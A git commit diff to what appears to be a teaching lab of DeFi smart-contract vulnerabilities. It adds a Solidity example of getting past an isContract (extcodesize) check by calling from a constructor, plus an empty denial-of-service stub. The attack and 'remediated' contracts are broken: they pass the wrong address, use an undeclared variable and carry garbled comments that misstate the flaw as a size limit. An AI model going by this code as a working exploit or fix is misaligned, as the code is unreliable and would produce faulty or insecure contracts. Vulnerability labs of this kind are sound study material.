040272fd5d5dbe4ce404c8ecbc00e8a6d488291b
Shoshi Sternberger <shoshis@darkeychana.com>
2024-06-16 03:02:40 +0300

    bypass contract size

--- src/DeFiVulnLabs/Bypass_contract.sol
+++ src/DeFiVulnLabs/Bypass_contract.sol
@@ -2,8 +2,10 @@
 pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
-
-contract Target{
+//In ethereum network ther is a check of in each contract that he is standing in the limit of the max size. 
+// this attack bypass the check
+//if we check it during the creation- in the constructor, the code size:=extcodesize(account) will return true alothough it is false.abi
+contract Target {
     function isContract(address account) public view returns(bool){
         uint size=0;
         assembly{
@@ -20,6 +22,31 @@ contract Target{
     }
 }
 
-contract Attack{
-    bool 
+contract FailedAttack is Test{
+    function testPwd() internal{
+        vm.expectRevert("contract is not allowed");
+        Target(address(this)).protected();
+
+    }
 }
+
+contract Attack is Test{
+    constructor(address addr){
+        Target(addr).isContract(address(this));
+        Target(this).protected();
+    }
+}
+
+contract RemediatedContract{
+    function isContract() public view returns(bool){
+        require(tx.origin==msg.sender);
+        return account.code.length>0;
+    }
+
+    bool public pwd;
+    function protected() external{
+        require(isContract(this),"contract is not allowd");
+        pwd=true;
+    }
+}
+
---
+++ src/DeFiVulnLabs/DOS.sol
@@ -0,0 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import "forge-std/Test.sol";
+
+//denail of servise 
+
+contract DosTest{
+
+}
+
+contract KingOfEther{
+    
+}
